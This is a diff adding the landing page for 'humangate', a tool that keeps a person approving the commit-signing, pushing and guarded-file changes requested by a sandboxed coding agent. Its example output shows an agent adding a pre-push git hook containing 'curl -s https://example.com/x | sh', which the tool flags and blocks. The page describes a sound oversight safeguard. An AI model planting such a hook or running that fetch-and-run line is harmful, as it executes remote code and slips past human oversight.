@@ -1,0 +1,88 @@
+---
+title: humangate
+description: Keeps a person in the loop for what a sandboxed coding agent can’t be trusted to do alone.
+template: splash
+hero:
+  tagline: Coding agents are safest in a sandbox without your keys. humangate keeps you in the loop for what the agent can’t be trusted to do alone.
+  actions:
+    - text: Get started
+      link: /getting-started/
+      icon: right-arrow
+    - text: View on GitHub
+      link: https://github.com/szajbus/humangate
+      icon: external
+      variant: minimal
+---
+
+import { Card, CardGrid } from '@astrojs/starlight/components';
+
+<CardGrid>
+	<Card title="Actions that need your keys" icon="approve-check">
+		The agent can’t sign a commit or push a branch, so it asks you to run the command on
+		the host. You see why and exactly what will run, and nothing happens until you say yes.
+	</Card>
+	<Card title="Files it shouldn’t change behind your back" icon="warning">
+		Git hooks and config, the tools you approve and whatever they run. humangate shows you
+		any change as a diff the moment it happens, and runs no request until you accept it.
+	</Card>
+</CardGrid>
+
+## How it looks
+
+In the sandbox, the agent asks:
+
+```
+$ humangate request --reason "Rebased onto main; signatures were lost" git-sign my-branch
+humangate: request 4f93b1686d8a3142 sent; waiting for approval on the host...
+```
+
+On the host, you decide:
+
+```
+$ humangate loop
+humangate loop watching /home/me/project/.humangate/queue (Ctrl-C to stop)
+Tools: git-push, git-push-with-force, git-sign
+Guarding: git config, .humangate/tools, .humangate/guard, .git/hooks, package.json (18 files)
+Log: /home/me/.humangate/logs/home-me-project.jsonl
+
+
+── Request 4f93b1686d8a3142 ──
+
+Rebased onto main; signatures were lost
+
+.humangate/tools/git-sign my-branch
+
+Run it? (↑/↓ and Enter, or a shortcut letter)
+    n  No
+  ❯ y  Yes, run it
+    a  Yes, and don't ask again for this exact command (until restart)
+    r  Reply to the agent instead...
+
+Re-signing:
+  9c424df Add the widget
+  052b5ed Test the widget
+
+Successfully rebased and updated refs/heads/my-branch.
+
+Exit code 0 - result sent to the agent
+```
+
+The agent’s `request` then prints the same output and exits with the tool’s exit code.
+
+If the agent edits a guarded file, say a `pre-push` hook, the loop rings the bell and shows it
+right away:
+
+```
+── Guarded files changed ──
+
+Requests are refused until you accept this or it's reverted.
+
+.git/hooks/pre-push added
+  @@ -0,0 +1,2 @@
+  +#!/bin/sh
+  +curl -s https://example.com/x | sh
+
+Accept the change? (↑/↓ and Enter, or a shortcut letter)
+  ❯ n  No - refuse requests until it's reverted
+    y  Yes, accept it as the approved state
+```
